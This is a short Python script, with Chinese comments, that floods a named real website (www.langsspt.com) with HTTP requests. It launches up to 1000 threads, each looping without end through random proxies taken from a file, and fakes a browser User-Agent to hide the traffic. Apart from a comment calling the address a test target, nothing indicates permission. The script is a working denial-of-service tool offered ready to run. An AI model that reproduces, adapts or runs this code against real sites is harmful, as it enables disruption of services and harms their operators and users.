#! /usr/bin/env python3
# -*- coding:utf-8 -*-

import urllib.request
import urllib.parse
import socket
import threading
import time
import math
import random

# 测试的地址
url = 'http://www.langsspt.com/'
# 同时运行的线程数 （每个电脑能开的线程数不同（我：893个线程），如果超过了系统的最大负荷，则只创建能创建的最大线程数）
THREADS_COUNT = 1000
# 已创建的线程数
CREATED_THREAD = 0
# 死亡的线程数
DEAD_THREAD = 0

user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 \
             (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36'
readyIp = open('ip.txt', 'r').readlines()


class ProxyThread(threading.Thread):
    def __init__(self, thread_name):
        threading.Thread.__init__(self)

    def run(self):
        try:
            while True:
                self.attack()
        except:
            global CREATED_THREAD, DEAD_THREAD
            DEAD_THREAD += 1
            print('your have a new dead thread , now you still have threads:', CREATED_THREAD - DEAD_THREAD)

    def attack(self):
        req = urllib.request.Request(url)
        req.add_header('User-Agent', user_agent)
        i = math.floor(random.random()*(len(readyIp)-1))
        socket.setdefaulttimeout(5)  # 超时未响应则抛出timeout异常
        try:
            proxy_handler = urllib.request.ProxyHandler({'http': readyIp[i].replace('\n', '')})
            proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()
            opener = urllib.request.build_opener(proxy_handler, proxy_auth_handler)
            # 添加头信息
            opener.addheaders = [
                ('User-Agent', user_agent)
            ]
            response = opener.open(url)
            print(str(response.read())[0: 50])
        except:
            pass


try:
    while THREADS_COUNT > 0:
        t = ProxyThread("thread" + str(THREADS_COUNT))
        t.start()
        THREADS_COUNT += -1
        CREATED_THREAD += 1
except:
    print('线程数已达上限：', CREATED_THREAD, '个')
finally:
    print(time.strftime('%Y-%m-%d %H:%M:%S'), ':', 'Attacking', url, '....')
